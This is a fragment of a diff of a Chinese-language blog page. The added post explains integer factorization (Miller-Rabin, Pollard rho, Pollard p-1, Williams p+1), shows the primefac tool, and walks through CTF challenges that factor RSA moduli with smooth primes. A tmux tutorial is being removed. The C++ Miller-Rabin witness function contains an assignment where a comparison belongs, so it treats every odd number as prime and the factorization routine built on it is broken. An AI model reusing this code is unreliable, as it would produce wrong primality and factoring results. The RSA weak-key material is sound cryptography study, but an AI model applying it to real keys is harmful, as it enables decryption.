)</span> <span class="comment">//快速乘法下的快速幂，叼</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans = q_mul( ans, a, mod );</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = q_mul( a, a, mod );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">witness</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> n )</span><span class="comment">//miller_rabin算法的精华</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tem = n - <span class="number">1</span>;</div><div class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(tem % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		tem /= <span class="number">2</span>;</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x = q_pow( a, tem, n ); <span class="comment">//得到a^(n-1) mod n</span></div><div class="line">	<span class="keyword">if</span>(x == <span class="number">1</span> || x == n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">while</span>(j--)</div><div class="line">	&#123;</div><div class="line">		x = q_mul( x, x, n );</div><div class="line">		<span class="keyword">if</span>(x = n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">miller_rabin</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span>  <span class="comment">//检验n是否是素数</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(n == <span class="number">2</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">if</span>(n &lt; <span class="number">2</span> || n % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= times; i++)  <span class="comment">//做times次随机检验</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">long</span> <span class="keyword">long</span> a = Random( n - <span class="number">2</span> ) + <span class="number">1</span>; <span class="comment">//得到随机检验算子 a</span></div><div class="line">		<span class="keyword">if</span>(!witness( a, n ))  <span class="comment">//用a检验n是否是素数</span></div><div class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(b == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">	<span class="keyword">return</span> gcd( b, a%b );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">pollard_rho</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span><span class="comment">//找到n的一个因子</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x, y, d, i = <span class="number">1</span>, k = <span class="number">2</span>;</div><div class="line">	x = Random( n - <span class="number">1</span> ) + <span class="number">1</span>;</div><div class="line">	y = x;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		i++;</div><div class="line">		x = (q_mul( x, x, n ) + c) % n;</div><div class="line">		d = gcd( y - x, n );</div><div class="line">		<span class="keyword">if</span>(<span class="number">1</span>&lt;d&amp;&amp;d&lt;n)</div><div class="line">			<span class="keyword">return</span> d;</div><div class="line">		<span class="keyword">if</span>(y == x)<span class="comment">//找到循环，选取失败，重新来</span></div><div class="line">			<span class="keyword">return</span> n;</div><div class="line">		<span class="keyword">if</span>(i == k) <span class="comment">//似乎是一个优化，但是不是很清楚</span></div><div class="line">		&#123;</div><div class="line">			y = x;</div><div class="line">			k &lt;&lt;= <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	<span class="keyword">if</span>(miller_rabin( n ))</div><div class="line">	&#123;</div><div class="line">		m[n]++;</div><div class="line">		number++;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> p = n;</div><div class="line">	<span class="keyword">while</span>(p &gt;= n)</div><div class="line">		p = pollard_rho( p, c-- );</div><div class="line">	find( p, c );</div><div class="line">	find( n / p, c );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tar;</div><div class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; tar)</div><div class="line">	&#123;</div><div class="line">		number = <span class="number">0</span>;</div><div class="line">		m.clear();</div><div class="line">		find( tar, <span class="number">2137342</span> );</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"%lld = "</span>, tar );</div><div class="line">		<span class="keyword">if</span>(m.empty())</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld\n"</span>, tar );</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">for</span>(<span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;::iterator c = m.begin(); c != m.end();)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld^%d"</span>, c-&gt;first, c-&gt;second );</div><div class="line">			<span class="keyword">if</span>((++c) != m.end())</div><div class="line">				<span class="built_in">printf</span>( <span class="string">" * "</span> );</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"\n"</span> );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x4-Pollard-39-s-p-1-算法"><a href="#0x4-Pollard-39-s-p-1-算法" class="headerlink" title="0x4 Pollard&#39;s p-1 算法"></a>0x4 Pollard&#39;s p-1 算法</h3><h4 id="4-1-smooth与powersmooth"><a href="#4-1-smooth与powersmooth" class="headerlink" title="4.1 smooth与powersmooth"></a>4.1 smooth与powersmooth</h4><p>如果一个整数的所有素因子都不大于B，我们称这个整数是B-Smooth数</p>
+<p>如果一个整数的所有素因子的对应指数次幂不大于B，我们称这个整数是B-powersmooth数</p>
+<p>$720({2^4}{3^2}{5^1})$ 是一个5-smooth数，6-smooth数，7-smooth数</p>
+<p>但5^1\&lt;3^2\&lt;2^4=16，所以它也是一个16-powersmooth数</p>
+<h4 id="4-2-原理解释"><a href="#4-2-原理解释" class="headerlink" title="4.2 原理解释"></a>4.2 原理解释</h4><p>n 是一个合数，其中一个质数位p，由费马小定理有：$a^{K(p-1)}=1(mod\ p)$</p>
+<p>如果 $x=1(mod\ p)$ ，就有 $p|gcd(x-1,n)$</p>
+<p>这个算法的思想就是构造p-1，其有多个素因子，并且每个素因子的powersmooth不超过B，开始时随机选取一个x， 计算 $x^w\ mod\ n$ , $w=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ ， 如果有$gcd(x^w, n)$ 不等于1， 那么我们就相当于找到一个素数p了</p>
+<h4 id="4-3-算法"><a href="#4-3-算法" class="headerlink" title="4.3 算法"></a>4.3 算法</h4><p><strong>Inputs</strong>: n: a composite number<br><strong>Output</strong>: a nontrivial factor of n or failure</p>
+<ol>
+<li>select a smoothness bound B</li>
+<li>define $M=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ (note: explicitly evaluating M may not be necessary)</li>
+<li>randomly pick a coprime to n (note: we can actually fix a, e.g. if n is odd, then we can always select a = 2, random selection here is not imperative)</li>
+<li>compute $g = gcd(a^M − 1, n)$ (note: exponentiation can be done modulo n)</li>
+<li>if 1 &lt; g &lt; n then return g</li>
+<li>if g = 1 then select a larger B and go to step 2 or return failure</li>
+<li>if g = n then select a smaller B and go to step 2 or return failure</li>
+</ol>
+<p>这里的larger B和smaller B有选择性的方法，具体是啥我也不太清楚！ </p>
+<h4 id="4-4-范例"><a href="#4-4-范例" class="headerlink" title="4.4 范例"></a>4.4 范例</h4><p>If we want to factor the number n = 299.</p>
+<ol>
+<li>We select B = 5.</li>
+<li>Thus $M = 2^2 × 3^1 × 5^1$.</li>
+<li>We select a = 2.</li>
+<li>$g = gcd(a^M − 1, n) = 13$.</li>
+<li>Since 1 &lt; 13 &lt; 299, thus return 13.</li>
+<li>299 / 13 = 23 is prime, thus it is fully factored: 299 = 13 × 23.</li>
+</ol>
+<h3 id="0x5-Williams-39-s-p-1-算法"><a href="#0x5-Williams-39-s-p-1-算法" class="headerlink" title="0x5 Williams&#39;s p + 1 算法"></a>0x5 Williams&#39;s p + 1 算法</h3><p>Pollard&#39;s p-1算法比较容易懂，但是Williams’s p+1算法却不怎么让人明白！</p>
+<h4 id="5-1-算法"><a href="#5-1-算法" class="headerlink" title="5.1 算法"></a>5.1 算法</h4><p>选择大于2的整数A，用其生成一个卢卡斯序列：</p>
+<p>$V_0=2, V_1=A,V_j=AV_{j-1}-V_{j-2}$</p>
+<h3 id="0xn-smooth质数"><a href="#0xn-smooth质数" class="headerlink" title="0xn smooth质数"></a>0xn smooth质数</h3><h4 id="n-1-p-1-光滑"><a href="#n-1-p-1-光滑" class="headerlink" title="n.1 p - 1 光滑"></a>n.1 p - 1 光滑</h4><p>当 p 是 N 的因数，并且 p - 1 是光滑的时候，可能可以使用 Pollard&#39;s p − 1 算法来分解 N，但是也不是完全可以成功的。</p>
+<h4 id="n-2-p-1-光滑"><a href="#n-2-p-1-光滑" class="headerlink" title="n.2 p + 1 光滑"></a>n.2 p + 1 光滑</h4><p>当 p 是 n 的因数，并且 p + 1 是光滑的时候，可能可以使用 Williams&#39;s p + 1 算法来分解 N，但是也不是完全可以成功的。</p>
+<h4 id="n-3-primefac包"><a href="#n-3-primefac包" class="headerlink" title="n.3 primefac包"></a>n.3 primefac包</h4><p>上面的两种光滑，都可以使用包<a href="https://pypi.python.org/pypi/primefac" target="_blank" rel="external">primefac</a> 来做</p>
+<p>primefac是一个贼好用的工具，环境一般在linux上，cygwin上也能用，运行速度贼快！</p>
+<font color="#f00">不能在windows上使用的原因</font>
+
+<p>在Windows中，多进程multiprocessing使用的是序列化pickle来在多进程之间转移数据，而socket对象是不能被序列化的，但是在linux操作系统上却没问题，因为在linux上多进程multiprocessing使用的是fork，所以在windows上可以改用多线程。</p>
+<p>常用的命令行使用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -m primefac [-vs] [-v|--verbose] [-s|--summary] [-t=NUM] [-r=NUM]</div><div class="line">                [-m=[prb][,p-1][,p+1][,ecm][,mpqs]] rpn</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">rpn is an expression in revese Polish notation and is evaluated using integer arithmetic. Each number that remains on the stack after evaluation is then factored.</div><div class="line"></div><div class="line">-t sets the trial division limit; the default value is 1000. Use -t=inf to use trial division exclusively.</div><div class="line"></div><div class="line">-r sets the number of rounds of Pollard’s rho algorithm to try before calling a factor “difficult”. The default value is 42,000. Use -r=inf to use Pollard’s rho exclusively once the trial division is completed.</div><div class="line"></div><div class="line">If verbosity is invoked, we indicate in the output which algorithm produced which factors during the multifactor phase.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is absent, then output is identical to the output of the GNU factor command, except possibly for the order of the factors and, if verbosity has been turned on, the annotations indicating which algorithm produced which factors.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is present, then output is modified by adding a single newline between each item’s output, before the first item, and after the last item. Each item’s output is also modified by printing a second line of data summarizing the results by describing the number of decimal digits in the input, the number of decimal digits in each prime factor, and the factors’ multiplicities</div><div class="line"></div><div class="line">The -v and -s flags may be combined into a single flag in either order — i.e., into -vs or -sv.</div><div class="line"></div><div class="line">The -m= flag controls the functions used during the multifactor phase. The options are prb, p-1, p+1, ecm, and mpqs, representing Pollard’s rho, Pollard’s p-1, Williams’ p+1, the elliptic curve method, and the multiple polynomial quadratic sieve, respectively. The options must be separated by commas. The options can be repeated: if prb is listed twice, for example, then multifactor will run two instances of pollardRho_brent simultaneously. In the case of prb and ecm, this decreases the expectation value of the time to find a factor, whereas the other three algorithms (p-1, p+1, and MPQS) have no randomized component so that running duplicate instances of these three algorithms confers no benefit. We therefore ignore repeated listings of the latter three methods: for example, calling</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m primefac -m=prb,prb,ecm,ecm,ecm,mpqs,mpqs 38 ! 1 +</div></pre></td></tr></table></figure>
+<p>从上面的说明中可以看出，primefac可以使用多种常用的分解质因数的方法，而rpn时使用逆波兰表示法表示的数。</p>
+<h4 id="n-4-整数分解的方法"><a href="#n-4-整数分解的方法" class="headerlink" title="n.4 整数分解的方法"></a>n.4 整数分解的方法</h4><ul>
+<li><a href="https://en.wikipedia.org/wiki/Trial_division" target="_blank" rel="external">Trial division</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Wheel_factorization" target="_blank" rel="external">Wheel factorization</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm" target="_blank" rel="external">Pollard&#39;s rho algorithm</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Algebraic-group_factorisation_algorithms" target="_blank" rel="external">Algebraic-group factorisation algorithms</a>, among which are <a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm" target="_blank" rel="external">Pollard&#39;s <em>p</em> − 1 algorithm</a>, <a href="https://en.wikipedia.org/wiki/Williams%27_p_%2B_1_algorithm" target="_blank" rel="external">Williams&#39; <em>p</em> + 1 algorithm</a>, and <a href="https://en.wikipedia.org/wiki/Lenstra_elliptic_curve_factorization" target="_blank" rel="external">Lenstra elliptic curve factorization</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Fermat%27s_factorization_method" target="_blank" rel="external">Fermat&#39;s factorization method</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Euler%27s_factorization_method" target="_blank" rel="external">Euler&#39;s factorization method</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Special_number_field_sieve" target="_blank" rel="external">Special number field sieve</a></li>
+</ul>
+<h3 id="0xn-1-ctf中范例"><a href="#0xn-1-ctf中范例" class="headerlink" title="0xn+1 ctf中范例"></a>0xn+1 ctf中范例</h3><h4 id="n-1-1-2017-SECCON-very-smooth"><a href="#n-1-1-2017-SECCON-very-smooth" class="headerlink" title="n+1.1 2017 SECCON very smooth"></a>n+1.1 2017 SECCON very smooth</h4><p>将题目从文件中binwalk出来之后，发现了一个证书，给出了大整数n</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line"></div><div class="line">149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line">Z309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div></pre></td></tr></table></figure>
+<p>至于这里为什么只能用Williams&#39;s <em>p</em> + 1 算法而不能用 Pollard&#39;s p − 1 算法分解，其原因可能如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002</div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line">Z154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line"></div><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 </div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5</div><div class="line">Z154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97</div></pre></td></tr></table></figure>
+<p>其实从此处看出，对于 p-1 确实有很多小因子，但是个数太多，这就会使得进行枚举的时候出现指数爆炸的情况，因此没有分解出来。</p>
+<h4 id="n-1-2-2018-Backdoor-Awesome-mix2"><a href="#n-1-2-2018-Backdoor-Awesome-mix2" class="headerlink" title="n+1.2 2018 Backdoor Awesome-mix2"></a>n+1.2 2018 Backdoor Awesome-mix2</h4><p>这道题是一道验证题，但是需要解决一个问题：</p>
+<p>已知s，m，（都是不超过1024位的大整数），求使得 $s^e=m(mod n)$ 的 e和n，约束条件是:</p>
+<p>$e&gt;=3, n&gt;=s, n.bit_length &lt;= 1025$</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/20/深度解读SSL-TLS实现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1810,480 +2220,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/tmux使用教程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/09/tmux使用教程/" itemprop="url">tmux使用教程</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T17:25:01+08:00">
-                2017-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="为什么要用-Tmux"><a href="#为什么要用-Tmux" class="headerlink" title="为什么要用 Tmux"></a>为什么要用 Tmux</h2><p>tmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。</p>
-<p>例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我现在的项目）。或者假设你正在咖啡店里工作，需要编译一些代码，而编译要花费 2 个小时才能完成（如果是和我一起工作的话），这时你又不得不离开咖啡店。如果使用了 tmux，你就可以轻松地断开当前的会话，并于稍后方便时重新接入该会话，继续工作。</p>
-<p>这真是太方便了。</p>
-<p>“如何使用 tmux 才能打开多个会话，如何在会话中打开多个标签（Tab），如何在标签中打开多个窗口（Window），又如何在窗口中打开多个窗格（Pane）”，也许有些人对这些操作更感兴趣。而我很少这样做的，因为我不喜欢打开太多的——实际上是尽可能少地打开——这些东西。因此，这篇入门教程主要讲解的也是作为简单的可持久化远程会话模型的 tmux。</p>
-<h3 id="远程操作计算机的生活方式"><a href="#远程操作计算机的生活方式" class="headerlink" title="远程操作计算机的生活方式"></a>远程操作计算机的生活方式</h3><p>机动性是 tmux 带给用户的最大价值。有很多开发者都是在服务器上进行所有工作的，他们只需从某处连接上服务器就可以开始工作了。有了 tmux（或者其他类似的工具），你就可以先坐在旧金山的某个咖啡店里开始在服务器上进行构建的工作，然后断开会话去赶飞机，待飞机降落到纽约市后再继续进行刚才的工作。</p>
-<p>tmux 带来的另一个好处是在移动办公中，作为客户端的计算机变得不再那么重要了。只需要升级你的笔记本，然后从版本库中克隆出 vim 和 tmux 的配置文件，就可以再次回到配置最优的操作环境了。而且这一切只需要短短的几分钟。</p>
-<p>总之，这些就是人们喜爱 tmux 的原因。当然即使你的生活不是四处奔波，也一样能体验到 tmux 带来的好处。</p>
-<h4 id="那么-screen-呢？"><a href="#那么-screen-呢？" class="headerlink" title="那么 screen 呢？"></a>那么 screen 呢？</h4><p>问得好。tmux 和 screen 很像，但比 screen 更好。要问好在哪里，简单的回答就是虽然与 screen 的功能相同，但是 tmux 设计得更好。screen 虽然可用，但是很不稳定。</p>
-<p>以下是一些 tmux 超越 screen 的地方：</p>
-<ul>
-<li>screen 的项目大体上已经终止了，并且代码中有大量的问题</li>
-<li>tmux 是一个活跃的项目，并且其代码库经常进行更新</li>
-<li>tmux 使用的是真正的客户端/服务器模型，而 screen 只是模拟了这种模型的行为</li>
-<li>tmux 同时支持 emacs 和 vim 的快捷键</li>
-<li>tmux 支持自动重命名窗口</li>
-<li>tmux 可以高度的脚本化</li>
-<li>tmux 的窗口分割功能更加先进</li>
-</ul>
-<p>这些优点已经足够了吧，开始使用 tmux 吧。</p>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>首先要告诉诸位的是 tmux 中的一个全局的快捷键开关，开关开启后就可以通过快捷键完成很多任务。</p>
-<h3 id="tmux-的快捷键"><a href="#tmux-的快捷键" class="headerlink" title="tmux 的快捷键"></a>tmux 的快捷键</h3><p>tmux 默认使用 <code>Ctrl-b</code> 作为激活快捷键的开关，开关开启后就可以通过快捷键迅速调用大量的功能。下面就给出一些基本功能的调用方法：</p>
-<p>首先按下</p>
-<p><code>$ Ctrl-b</code></p>
-<p>接下来就可以按下一些后面将会讲解的快捷键了。不过先不要着急，可以先为能方便地使用组合键 <code>Ctrl-b</code> 做一点准备。不妨在操作系统中将键盘上的 CAPSLOCK 键映射为 Ctrl 键，这样当需要按下这个组合键时，小拇指的移动就可以更加舒服了。</p>
-<h3 id="运行-tmux"><a href="#运行-tmux" class="headerlink" title="运行 tmux"></a>运行 tmux</h3><p>好了，下面让我们从运行 tmux 开始。首先选择一台你希望在断开会话后依然可以重新接入的计算机（对我来说这通常是远程服务器），然后在上面运行如下的命令：</p>
-<p><code>$ tmux</code></p>
-<p>很简单对吧。这样就开启了一个 tmux 的会话，你可以断开这个会话并在稍后再重新接入。</p>
-<h3 id="显示所有会话"><a href="#显示所有会话" class="headerlink" title="显示所有会话"></a>显示所有会话</h3><p>由于 tmux 的理念是可以开启多个会话，并且可以自由地断开会话后重新接入，为此我们需要首先能看到可用的会话。有两种方法可以实现这个目的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via shortcut (by default Ctrl-b)</div><div class="line"># 使用快捷键（默认为 Ctrl-b）</div><div class="line"> </div><div class="line">$ Ctrl-b s</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via tmux command</div><div class="line"># 使用 tmux 的子命令</div><div class="line"> </div><div class="line">$ tmux ls</div></pre></td></tr></table></figure>
-<p>上面两种方法的效果相同，都可以得到类似下面的结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0: 1 windows (created Thu Nov 28 06:12:52 2013) [80x24] (attached)</div></pre></td></tr></table></figure>
-<h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><p>下面我们就来新建一个会话。可以使用 <code>new</code> 命令新建会话，并且该命令允许以参数的形式传递一个会话名。我的建议是在新建时要提供一个会话名以便于日后管理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux new -s session-name</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Without naming the new session (not recommended) </div><div class="line"># 新建会话但并不指定名字 (不推荐这样做) </div><div class="line"> </div><div class="line">$ tmux new</div></pre></td></tr></table></figure>
-<h3 id="接入一个之前的会话"><a href="#接入一个之前的会话" class="headerlink" title="接入一个之前的会话"></a>接入一个之前的会话</h3><p>既然我们已经创建了多个带有名称的会话，那么就可以随时接入了，有几种方法可以实现接入会话：</p>
